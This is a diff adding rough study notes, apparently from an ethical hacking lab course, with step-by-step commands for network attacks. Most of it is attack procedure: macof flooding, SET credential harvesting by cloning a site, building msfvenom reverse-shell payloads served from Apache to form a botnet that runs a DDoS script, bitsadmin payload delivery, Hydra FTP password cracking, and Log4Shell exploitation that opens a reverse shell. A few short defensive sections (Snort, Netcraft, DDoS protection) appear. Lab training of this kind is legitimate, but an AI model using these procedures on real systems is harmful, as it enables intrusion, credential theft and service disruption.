@@ -717,11 +717,347 @@ new debugging option, "Set permanent breakpoints on system calls." When active, 
 Gain Control over a Victim Machine using the njRAT RAT Trojan
 
 Create a Virus using the JPS Virus Maker Tool and Infect the Target System
+--------------------------------------------
+8 Overview of Network Sniffing
+Perform MAC Flooding using macof
+open wireshrak eth0
+run cd command to jump to the root directory.
+macof -i eth0 -n 10
+macof -i eth0 -d [Target IP Address] (-d: Specifies the destination IP address).
+
+ Perform a DHCP Starvation Attack using Yersinia
+wireshark 
+cd to navigate to the root directory
+Run yersinia -I to open Yersinia in interactive mode
+
+Detect ARP Poisoning and Promiscuous Mode in a Switch-Based Network
+
+
+Run cd command to jump to root directory.
+Run hping3 [Target IP Address] -c 100000 command (here, target IP address is 10.10.1.11 [Windows 11]).
+-c: specifies the packet count.
+Run nmap --script=sniffer-detect [Target IP Address/ IP Address Range]  to start scanning.
+
+-------------------------------------------------------
+9 Sniff credentials using the Social-Engineer Toolkit (SET)
+
+Run setoolkit to launch Social-Engineer Toolkit.
+
+Type 1 and press Enter to choose Social-Engineering Attacks.
+type 2 and press Enter to choose Website Attack Vectors
+
+ type 3 and press Enter to choose Credential Harvester Attack Method.
+	7. Type 2 and press Enter to choose Site Cloner from the menu.
+IP address of the local machine (10.10.1.13) in the prompt for "IP address for the POST back in Harvester/Tabnabbing" and press Enter.
+
+
+ "Enter the url to clone" and press Enter. In this task, we will clone the URL
+
+
+ Detect a Phishing Attack
+
+
+Detect Phishing using Netcraft
+
+
+First, it is necessary to install the Netcraft extension. Launch any web browser, and go to https://www.netcraft.com/apps-extensions
+
+-------------------------------------------
+10 ) Perform a DDoS Attack using ISB and UltraDDOS-v2
+
+
+ ISB (Im So Bored).exe
+
+Perform a DDoS Attack using Botnet
+
+Run the command msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe to generate exploit1.exe payload.
+
+run the above command with different port number and exploit name.
+	• For Windows 11 -> port 6969, exploit1.exe
+	• For Windows Server 2019 -> port 9999, exploit2.exe
+	• For Windows Server 2022 -> port 5555, exploit3.exe
+
+
+	4. Create a new directory to share the exploits file with the target machine and provide the permissions using the below commands:
+	• Run mkdir /var/www/html/share command to create a shared folder
+	• Run chmod -R 755 /var/www/html/share/ command
+	• Run chown -R www-data:www-data /var/www/html/share/ command
+
+
+
+	5. Copy the payloads into the shared folder by executing cp exploit1.exe exploit2.exe exploit3.exe /var/www/html/share/ command.
+	6. Start the Apache server by running service apache2 start command.
+
+
+aunch three new terminals and run command sudo su with password as toor on all.
+	8. Run msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run" command to launch Metasploit Framework on terminal 1.
+
+
+ run the above command on terminal 2 and 3 by changing the lport to 9999 and 5555 simultaneously
+
+click on exploit1.exe to download the file.
+If it gives security warning, ignore it and download it by clicking on Keep button
+	14. Similarly, download exploit2.exe on Windows Server 2019, and exploit3.exe on Windows Server 2022 and run it.
+
+
+we will upload the DDoS script to our botnets, in windows shell terminal execute command upload /home/attacker/Downloads/eagle-dos.py and run shell command.
+Upload DDoS script on all the shell terminals
+
+	18. Run the DDoS file using command python eagle-dos.py on windows shell terminal. It will ask for Target's IP, type 10.10.1.9 and hit enter.
+Make sure you run script on all 3 shell terminals.
+
+
+Detect and Protect Against DoS and DDoS Attacks
+
+
+Anti DDoS Guardian is a DDoS attack protection tool. It protects IIS servers, Apache serves, game servers, Camfrog servers, mail servers, FTP servers, VOIP PBX, and SIP servers and other systems. Anti DDoS Guardian monitors each incoming and outgoing packet in Real-Time. It displays the local address, remote address, and other information of each network flow. Anti DDoS Guardian limits network flow number, client bandwidth, client concurrent TCP connection number, and TCP connection rate. It also limits the UDP bandwidth, UDP connection rate, and UDP packet rate.
+
+
+Low Orbit Ion Cannon (LOIC) and double-click LOIC.exe.
+If an Open File - Security Warning pop-up appears, click Run.
+
+
+----
+
+11 session hijacking 
+
+
+Hijack a Session using Caido
+
+Session Hijacking 
+
+
+ session hijacking attack refers to the exploitation of a session token-generation mechanism or token security controls that enables an attacker to establish an unauthorized connection with a target server
+
+
+Hijack a session using Caido
+Intercept HTTP traffic using Hetty
+
+Caido to perform session hijacking on the target machine.
+Run ipconfig/flushdns command to reset dns cache and close the Command Prompt.
+Caido create account and edit set port 
+Click on + Create a project button to create a new project. Create a project pop-up appears, name it as Session Hijacking and click Create.
+Click on Intercept option on the left pane
+Click the Forwarding icon and wait until it changes to Queuing. This button will trap and display the next response or request from the victim's machine in the Intercept tab.
+The Forwarding icon turns automatically from green to red.
+Open Firefox web browser and navigate to http://10.10.1.11:8080/ca.crt. CA certificate will be downloaded automatically as shown in the screenshot
+
+In Firefox web browser, select Settings from the context menu.
+On the Settings page, search for Certificates and open View Certificates
+
+Navigate to Authorities tab and click on Import…
 
 
 
 
 
+
+
+Wireshark allows you to capture and interactively browse the traffic running on a network. The tool uses WinPcap to capture packets, and so is only able to capture packets on networks that are supported by WinPcap. It captures live network traffic from Ethernet, IEEE 802.11, PPP/HDLC, ATM, Bluetooth, USB, Token Ring, Frame Relay, and FDDI networks. Security professionals can use Wireshark to monitor and detect session hijacking attempts.
+
+
+1. Run bettercap -iface eth0 to set the network interface.
+-iface: specifies the interface to bind to (here, eth0).
+
+Type net.probe on and press Enter. This module will send different types of probe packets to each IP in the current subnet for the net.recon module to detect them.
+
+2. Type net.probe on and press Enter. This module will send different types of probe packets to each IP in the current subnet for the net.recon module to detect them.
+3. Type net.recon on and press Enter. This module is responsible for periodically reading the system ARP table to detect new hosts on the network.
+The net.recon module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets.
+4. Type net.sniff on and press Enter. This module is responsible for performing sniffing on the network.
+
+
+Go to windows 11 for anyalsi s
+
+
+
+Hetty
+
+5. Select the POST request and in the lower section of the page, select Body tab under POST section.
+6. Under the Body tab, you can observe the captured user credentials,
+
+-----
+
+Intruder 
+
+
+
+Detect Intrusions using Snort
+Snort is an open-source network intrusion detection system, capable of performing real-time traffic analysis and packet logging on IP networks. It can perform protocol analysis and content searching/matching and is used to detect a variety of attacks and probes such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. It uses a flexible rules language to describe traffic to collect or pass, as well as a detection engine that utilizes a modular plug-in architecture.
+
+
+Uses of Snort:
+• Straight packet sniffer such as tcpdump
+• Packet logger (useful for network traffic debugging, etc.)
+• Network intrusion prevention system
+
+7. Snort installed 
+8. snort.conf is already present in C:\Snort\etc; replace the file with the newly copied file.
+9. so_rules ,preproc_rules ,rules - repalce from C:\Snort\
+
+cd C:\Snort\bin enter type snort to start snort
+
+
+Ctrl+C after some time,
+
+Now type snort -W. This command lists your machine's physical address, IP address, and Ethernet Drivers, but all are disabled by default.
+
+10. Observe your Ethernet Driver index number and write it down (in this task, it is 2).
+11. To enable the Ethernet Driver, in the command prompt, run command snort -dev -i 2.
+
+
+BITS (Background Intelligent Transfer Service) is an essential component of Windows XP and later versions of Windows operating systems. BITS is used by system administrators and programmers for downloading files from or uploading files to HTTP webservers and SMB file shares. BITSAdmin is a tool that is used to create download or upload jobs and monitor their progress
+
+Windows server off the fierewall 
+
+In the terminal window, type msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe and press Enter, to create the payload.
+
+
+• Type mkdir /var/www/html/share and press Enter to create a shared folder
+• Type chmod -R 755 /var/www/html/share and press Enter
+• Type chown -R www-data:www-data /var/www/html/share and press Enter
+• Copy the malicious file to the shared location by typing cp Exploit.exe /var/www/html/share and pressing Enter
+• Now, start the Apache service. To do this, run service apache2 start command
+
+Swithc to window server 
+
+In the PowerShell window, type bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe and press Enter
+
+
+
+
+Module 13: Hacking Web Servers
+
+12. Footprint the web server
+• Footprint a web server using Netcat and Telnet
+• Enumerate web server information using Nmap Scripting Engine (NSE)
+13. Perform a web server attack
+• Crack FTP credentials using a Dictionary Attack
+• Gain Access to Target Web Server by Exploiting Log4j Vulnerability
+
+Netcat
+Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol
+Telnet
+Telnet is a client-server network protocol. It is widely used on the Internet or LANs. It provides the login session for a user on the Internet. The single terminal attached to another computer emulates with Telnet. The primary security problems with Telnet are the following:
+• It does not encrypt any data sent through the connection.
+• It lacks an authentication scheme.
+Telnet helps users perform banner-grabbing attacks. It probes HTTP servers to determine the Server field in the HTTP response header.
+Parrot 
+ nc -vv www.moviescope.com 80.
+
+14. Once you hit Enter, the netcat will display the hosting information of the provided domain.
+15. Now, type GET / HTTP/1.0 and press Enter twice.
+16. Netcat will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information.
+
+
+
+
+Now, perform banner grabbing using telnet. In the terminal window, run telnet www.moviescope.com 80.
+
+Type GET / HTTP/1.0 and press Enter twice. Telnet will perform the banner grabbing and gather information such as content type, last modified date, accept ranges, ETag, and server information
+
+
+
+
+Enumerate Web Server Information using Nmap Scripting Engine (NSE)
+
+
+Enumerate the directories used by web servers and web applications, in the terminal window. Run nmap -sV --script=http-enum [target website].
+
+Server info host - server OS details 
+
+17. The next step is to discover the hostnames that resolve the targeted domain.
+18. In the terminal window, run nmap --script hostmap-bfk -script-args hostmap-bfk.prefix=hostmap- www.goodshopping.com.
+19. Perform an HTTP trace on the targeted domain. In the terminal window, run nmap --script http-trace -d www.goodshopping.com.
+20. This script will detect a vulnerable server that uses the TRACE method by sending an HTTP TRACE request that shows if the method is enabled or not.
+21. Now, check whether Web Application Firewall is configured on the target host or domain. In the terminal window, run nmap -p80 --script http-waf-detect www.goodshopping.com.
+22. This command will scan the host and attempt to determine whether a web server is being monitored by an IPS, IDS, or WAF.
+23. This command will probe the target host with malicious payloads and detect the changes in the response code
+
+
+
+the port number of the ms-wbt-server service, which is open on the web server.
+
+• Crack FTP credentials using a Dictionary Attack
+• Gain Access to Target Web Server by Exploiting Log4j Vulnerability
+
+
+
+Crack FTP Credentials using a Dictionary Attack
+A dictionary or wordlist contains thousands of words that are used by password cracking tools to break into a password-protected system
+
+
+open FTP port using Nmap, and then perform a dictionary attack using the THC Hydra tool.
+
+
+nmap -p 21 [Target ip]
+
+Also give you mac address
+
+In the terminal window, run hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 11].
+
+Got user name and password 
+
+
+Ftp target ip
+
+Login .
+
+mkdir Hacked
+Enter help to view all other commands that you can use through the FTP terminal
+
+
+-----
+
+Gain Access to Target Web Server by Exploiting Log4j Vulnerability
+
+
+Log4j is an open-source framework that helps developers store various types of logs produced by users. Log4j which is also known as Log4shell and LogJam is a zero-day RCE (Remote Code Execution) vulnerability, tracked under CVE-2021-44228. Log4j enables insecure JNDI lookups, when these JNDI lookups are paired with the LDAP protocol, can be exploited to exfiltrate data or execute arbitrary code.
+
+Login to ubuntu 
+sudo su
+toor
+sudo apt-get update 
+sudo apt-get install docker.io
+then y and y 
+Once docker.io is successfully installed, type cd log4j-shell-poc/ and press Enter to navigate to log4j-shell-poc directory
+we need to setup log4j vulnerable server, to do that type docker build -t log4j-shell-poc . and press Enter.
+-t: specifies allocating a pseudo-tty
+Type docker run --network host log4j-shell-poc and press Enter, to start the vulnerable server.
+Open a Terminal window with superuser previleges and run nmap -sV -sC taregtip command to view the running services.
+we got ip 
+
+-sV option enables version detection
+-sC option enables the use of default scripts in the Nmap Scripting Engine (NSE). These scripts perform various tasks like service detection, vulnerability detection, and more.
+
+run searchsploit -t Apache RCE command to view the RCE vulnerabilities on the Apache server.
+Java platform is vulnerable for Apache Log4j 2 - Remote Command Execution (RCE) exploit.
+We will now exploit Log4j vulnerability present in the target Web Server to perform Remote code execution.
+
+
+In the address bar of the browser, type http://ipfoundduringscan:8080 and press Enter.
+parrot secuirty 
+cd log4j-shell-poc/
+tar -xf jdk-8u202-linux-x64.tar.gz  should be present in folder -xf: specifies extract all files.
+ls
+Now we will move the jdk1.8.0_202 into /usr/bin/. To do that, type mv jdk1.8.0_202 /usr/bin/ and press Enter.
+Now, we need to update the installed JDK path in the poc.py file.
+Navigate to the previous terminal window. In the terminal, type pluma poc.py and press Enter to open poc.py file.
+In the poc.py file scroll down and in line 62, replace jdk1.8.0_20/bin/javac with /usr/bin/jdk1.8.0_202/bin/javac
+Scroll down to line 87 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java.
+Scroll down to line 99 and replace jdk1.8.0_20/bin/java with /usr/bin/jdk1.8.0_202/bin/java
+After making all the changes save the changes and close the poc.py editor window.
+Now, open a new terminal window and type nc -lvp 9001 and press Enter, to initiate a netcat listener as shown in screenshot.
+Switch to previous terminal window and type python3 poc.py --userip 10.10.1.13 --webport 8080 --lport 9001 and press Enter, to start the exploitation and create payload.
+Now, copy the payload generated in the send me: section.
+Switch to Firefox browser window, in Username field paste the payload that was copied in previous step and in Password field type password and press Login button as shown in the screenshot.
+In the Password field you can enter any password.
+Now switch to the netcat listener, you can see that a reverse shell is opened.
+In the listener window type pwd and press Enter, to view the present working directory.
+Now, type whoami and press Enter.
+
+- type cat RootFlag.txt to view answer
+- (If not connect to reverse shell reload the website and check the path and try again )
 
 
 
